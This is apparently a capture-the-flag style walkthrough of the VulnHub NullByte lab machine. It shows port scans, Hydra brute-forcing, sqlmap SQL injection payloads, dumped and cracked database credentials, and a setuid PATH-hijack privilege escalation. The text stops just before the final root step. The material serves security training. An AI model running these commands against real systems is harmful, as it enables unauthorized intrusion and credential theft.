<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://dirb.sourceforge.net/">dirb</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.134 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ sudo netdiscover -r 10.1.1.0/24
</span><span class='line'> Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                  
</span><span class='line'>                                                                                                                                                                
</span><span class='line'> 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300                                                                                                
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address      Count  Len   MAC Vendor                   
</span><span class='line'> ----------------------------------------------------------------------------- 
</span><span class='line'> 10.1.1.1        00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                  
</span><span class='line'> 10.1.1.2        00:50:56:fd:d1:6b    01    060   VMWare, Inc.                                                                                                  
</span><span class='line'> 10.1.1.134      00:0c:29:e1:e0:98    01    060   VMware, Inc.                                                                                              
</span><span class='line'> 10.1.1.254      00:50:56:ee:31:18    01    060   VMWare, Inc.</span></code></pre></td></tr></table></div></figure>


<p>10.10.10.134 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ sudo us -H -msf -Iv -p 1-65535 10.1.1.134
</span><span class='line'>listener statistics 147984 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open              http[   80]     from 10.1.1.134  ttl 64 
</span><span class='line'>TCP open            sunrpc[  111]     from 10.1.1.134  ttl 64 
</span><span class='line'>TCP open    multiling-http[  777]     from 10.1.1.134  ttl 64 
</span><span class='line'>TCP open           unknown[32942]     from 10.1.1.134  ttl 64</span></code></pre></td></tr></table></div></figure>


<p>From the result above, TCP port 80, 111, 777 and 32942 have been discovered.</p>

<p>Then I run NMAP scan to probe more detail information for the four opening ports.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 6.49BETA4 scan initiated Mon Aug 17 07:06:13 2015 as: nmap -v -sV -O -A -T4 -p 80,111,777,32942 -oN NullByte_nmap.txt 10.1.1.134
</span><span class='line'>Nmap scan report for 10.1.1.134
</span><span class='line'>Host is up (0.00044s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
</span><span class='line'>|_http-methods: GET HEAD POST OPTIONS
</span><span class='line'>|_http-server-header: Apache/2.4.10 (Debian)
</span><span class='line'>|_http-title: Null Byte 00 - level 1
</span><span class='line'>111/tcp   open  rpcbind 2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          32942/tcp  status
</span><span class='line'>|_  100024  1          47213/udp  status
</span><span class='line'>777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
</span><span class='line'>|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
</span><span class='line'>|_  256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
</span><span class='line'>32942/tcp open  status  1 (RPC #100024)
</span><span class='line'>MAC Address: 00:0C:29:E1:E0:98 (VMware)
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.029 days (since Mon Aug 17 06:25:06 2015)
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>TCP Sequence Prediction: Difficulty=264 (Good luck!)
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.44 ms 10.1.1.134
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'># Nmap done at Mon Aug 17 07:06:29 2015 -- 1 IP address (1 host up) scanned in 16.18 seconds</span></code></pre></td></tr></table></div></figure>


<p>I found that the port 777 is running SSH and apache 2.4.10 is running on port 80, and the server is Debian Linux with 3.x kernel.</p>

<p>Then I use <code>nikto</code> to scan if any known vulnerabilty can be found which will be a life saver.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          10.1.1.134
</span><span class='line'>+ Target Hostname:    10.1.1.134
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2015-08-17 07:01:56 (GMT-4)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.4.10 (Debian)
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0xc4 0x51c42a5c32a70 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
</span><span class='line'>+ Uncommon header 'x-ob_mode' found, with contents: 0
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
</span><span class='line'>+ 7668 requests: 0 error(s) and 9 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-08-17 07:02:17 (GMT-4) (21 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>Nothing too exciting, but found phpmyadmin installed and a folder <code>/phpmyadmin/</code>.</p>

<h3>Secret in the Pic</h3>

<p>Then I tried default password and some weak passwords with login phpmyadmin, but all failed.</p>

<p>Then I open iceweasel browser to have a close look at the website. There is only a picture with a sentence <code>If you search for the laws of harmony, you will find knowledge.</code></p>

<p>Nothing wrong about the sentence&hellip; but hint is hidden in the picture&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte$ strings main.gif 
</span><span class='line'>GIF89a
</span><span class='line'>P-): kzMb5nVYJw
</span><span class='line'>cccIII@@@GGG444999```&lt;&lt;&lt;
</span><span class='line'>ooo>>>EEE
</span><span class='line'>???^^^
</span><span class='line'>HHH;;;
</span><span class='line'>gggRRRJJJ+++
</span><span class='line'>TTTZZZ
</span><span class='line'>QQQ///
</span><span class='line'>~~~'''CCC
</span><span class='line'>   AAA
</span><span class='line'>aaa222
</span><span class='line'>... ...</span></code></pre></td></tr></table></div></figure>


<p>Pay attention to the second line below the <code>GIF89a</code>:</p>

<p><code>P-): kzMb5nVYJw</code></p>

<p>Then I tried to use the string &lsquo;kzMb5nVYJw&rsquo; as an hidden folder and found the hidden login page:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/nullbyte1/1.png"></p>

<p>From the source code, I noticed that this form is not connected to mysql and password is not complex&hellip; so here would be an online brute force attacking based on password-dict.</p>

<p>I use Hydra with rockyou.txt dictionary to brute force the login form and got the password: <code>elite</code>. (The parameter <code>-l admin</code> does not make any sense, just get rid of errors)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte$ sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.1.1.134 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid"
</span><span class='line'>[sudo] password for F4l13n: 
</span><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-17 09:20:13
</span><span class='line'>[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
</span><span class='line'>[DATA] attacking service http-post-form on port 80
</span><span class='line'>[80][http-post-form] host: 10.1.1.134   login: admin   password: elite
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-08-17 09:20:57</span></code></pre></td></tr></table></div></figure>


<p>When I logged in with password <code>elite</code>, I have been forwarded to the following username searching page.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/nullbyte1/2.png"></p>

<p>After tired several common SQLi test, I found SQL injection vulnerability exists in the parameter <code>usrtosearch</code>, the injection point is <code>http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=admin</code></p>

<p>Then I use SQLMAP to finish all the rest works:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u "http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*" --dbs
</span><span class='line'>... ...
</span><span class='line'>[09:45:30] [WARNING] in OR boolean-based injections, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
</span><span class='line'>URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
</span><span class='line'>sqlmap identified the following injection point(s) with a total of 151 HTTP(s) requests:
</span><span class='line'>---
</span><span class='line'>Parameter: #1* (URI)
</span><span class='line'>    Type: boolean-based blind
</span><span class='line'>    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
</span><span class='line'>    Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=-8162" OR 3808=3808#
</span><span class='line'>
</span><span class='line'>    Type: AND/OR time-based blind
</span><span class='line'>    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)
</span><span class='line'>    Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=123" AND (SELECT * FROM (SELECT(SLEEP(5)))hjFz)#
</span><span class='line'>
</span><span class='line'>    Type: UNION query
</span><span class='line'>    Title: MySQL UNION query (NULL) - 3 columns
</span><span class='line'>    Payload: http://10.1.1.134:80/kzMb5nVYJw/420search.php?usrtosearch=123" UNION ALL SELECT NULL,NULL,CONCAT(0x7170706271,0x6845736a5777725a736a,0x71706b7a71)#
</span><span class='line'>---
</span><span class='line'>[09:45:32] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Debian
</span><span class='line'>web application technology: Apache 2.4.10
</span><span class='line'>back-end DBMS: MySQL 5.0.12
</span><span class='line'>[09:45:32] [INFO] fetching database names
</span><span class='line'>available databases [5]:
</span><span class='line'>[*] information_schema
</span><span class='line'>[*] mysql
</span><span class='line'>[*] performance_schema
</span><span class='line'>[*] phpmyadmin
</span><span class='line'>[*] seth
</span><span class='line'>
</span><span class='line'>[09:45:33] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.1.1.134'
</span><span class='line'>
</span><span class='line'>[*] shutting down at 09:45:33</span></code></pre></td></tr></table></div></figure>


<p>Checking the databases to grab passwords:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u "http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*" --batch --smart --dump -C User,Password,Host,Super_priv -T user -D mysql
</span><span class='line'>
</span><span class='line'>... ...
</span><span class='line'>Database: mysql
</span><span class='line'>Table: user
</span><span class='line'>[6 entries]
</span><span class='line'>+------------------+-------------------------------------------------------+-----------+------------+
</span><span class='line'>| User             | Password                                              | Host      | Super_priv |
</span><span class='line'>+------------------+-------------------------------------------------------+-----------+------------+
</span><span class='line'>| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | localhost | Y          |
</span><span class='line'>| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | nullbyte  | Y          |
</span><span class='line'>| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | 127.0.0.1 | Y          |
</span><span class='line'>| root             | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | ::1       | Y          |
</span><span class='line'>| debian-sys-maint | *BD9EDF51931EC5408154EBBB88AA01DA22B8A8DC             | localhost | Y          |
</span><span class='line'>| phpmyadmin       | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale) | localhost | N          |
</span><span class='line'>+------------------+-------------------------------------------------------+-----------+------------+
</span><span class='line'>
</span><span class='line'>[09:56:13] [WARNING] table 'mysql.`user`' dumped to CSV file '/root/.sqlmap/output/10.1.1.134/dump/mysql/user-f3649c95.csv'
</span><span class='line'>[09:56:13] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.1.1.134'
</span><span class='line'>
</span><span class='line'>[*] shutting down at 09:56:13</span></code></pre></td></tr></table></div></figure>


<p>Found mysql database login (this also can be used to login phpmyadmin): <code>root / sunnyvale</code></p>

<h3>Be ramses!</h3>

<p>There is another users table in database <code>seth</code>, which including the password hash of user <code>ramses</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kali# sqlmap -u "http://10.1.1.134/kzMb5nVYJw/420search.php?usrtosearch=123*" --batch --smart --dump -T users -D seth
</span><span class='line'>... ...
</span><span class='line'>[10:12:15] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Debian
</span><span class='line'>web application technology: Apache 2.4.10
</span><span class='line'>back-end DBMS: MySQL 5.0.12
</span><span class='line'>[10:12:15] [INFO] fetching columns 'position, user, id, pass' for table 'users' in database 'seth'
</span><span class='line'>[10:12:15] [INFO] fetching entries of column(s) '`position`, `user`, id, pass' for table 'users' in database 'seth'
</span><span class='line'>[10:12:15] [INFO] analyzing table dump for possible password hashes
</span><span class='line'>Database: seth
</span><span class='line'>Table: users
</span><span class='line'>[2 entries]
</span><span class='line'>+----+--------+------------+---------------------------------------------+
</span><span class='line'>| id | user   | position   | pass                                        |
</span><span class='line'>+----+--------+------------+---------------------------------------------+
</span><span class='line'>| 1  | ramses | &lt;blank>    | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |
</span><span class='line'>| 2  | isis   | employee   | --not allowed--                             |
</span><span class='line'>+----+--------+------------+---------------------------------------------+
</span><span class='line'>
</span><span class='line'>[10:12:15] [INFO] table 'seth.users' dumped to CSV file '/root/.sqlmap/output/10.1.1.134/dump/seth/users.csv'
</span><span class='line'>[10:12:15] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.1.1.134'
</span><span class='line'>
</span><span class='line'>[*] shutting down at 10:12:15</span></code></pre></td></tr></table></div></figure>


<p>Found user login credentials: <code>ramses / YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE</code></p>

<p>Base64 decoded the encrypted password and got a MD5 hash: <code>c6d6bd7ebf806f43c76acc3681703b81</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ echo YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | base64 -d
</span><span class='line'>c6d6bd7ebf806f43c76acc3681703b81base64: invalid input</span></code></pre></td></tr></table></div></figure>


<p>Then crack the MD5 hash to get password in plaintext, which is <code>omega</code></p>

<p>Then downloading <code>/etc/passwd</code> for further enumeration.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span><span class='line'>systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span><span class='line'>systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span><span class='line'>systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span><span class='line'>messagebus:x:104:111::/var/run/dbus:/bin/false
</span><span class='line'>avahi:x:105:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
</span><span class='line'>Debian-exim:x:106:114::/var/spool/exim4:/bin/false
</span><span class='line'>statd:x:107:65534::/var/lib/nfs:/bin/false
</span><span class='line'>colord:x:108:117:colord colour management daemon,,,:/var/lib/colord:/bin/false
</span><span class='line'>sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>saned:x:110:119::/var/lib/saned:/bin/false
</span><span class='line'>hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
</span><span class='line'>bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
</span><span class='line'>eric:x:1001:1001:,,,:/home/eric:/bin/bash
</span><span class='line'>mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>ramses:x:1002:1002:,,,:/home/ramses:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>user <code>ramses</code> found in <code>/etc/passwd</code> file.</p>

<p>From previous findings, I know SSH is open on port 777, so try to SSH login with cracked password <code>ramses / omega</code> and bingo!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~/vulnhub/NullByte/sqlmap_rst$ ssh ramses@10.1.1.134 -p 777
</span><span class='line'>ramses@10.1.1.134's password: 
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
</span><span class='line'>ramses@NullByte:~$ id
</span><span class='line'>uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
</span><span class='line'>ramses@NullByte:~$ pwd
</span><span class='line'>/home/ramses
</span><span class='line'>ramses@NullByte:~$</span></code></pre></td></tr></table></div></figure>


<p>Now I am ramses!</p>

<h3>Privilege Escalation</h3>

<p>Looking around and found interesting program <code>procwatch</code> which has <code>setuid</code> set in the folder <code>/var/www/backup</code></p>

<p>By running the program and analysing the outcome, I can recognize that it calls system command <code>ps</code> in the program. However the program does not use full path of <code>ps</code>, so here is mis-configuration vulnerability which could be exploited by an attacker to make fake <code>ps</code> and set <code>$PATH</code> to get ROOT privilege.</p>

<p>Then I wrote a shell script and saved as &lsquo;ps&rsquo;, and grant executable permition for it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat ps
</span><span class='line'>#!/bin/sh
</span><span class='line'>id
</span><span class='line'>/bin/sh
</span><span class='line'>
</span><span class='line'># chmod +x ps</span></code></pre></td></tr></table></div></figure>


<p>Then change the environment variable <code>$PATH</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ramses@NullByte:/var/www/backup$ echo $PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
</span><span class='line'>ramses@NullByte:/var/www/backup$ echo $PATH
</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>Then run the program <code>procwatch</code> to get ROOT:</p>

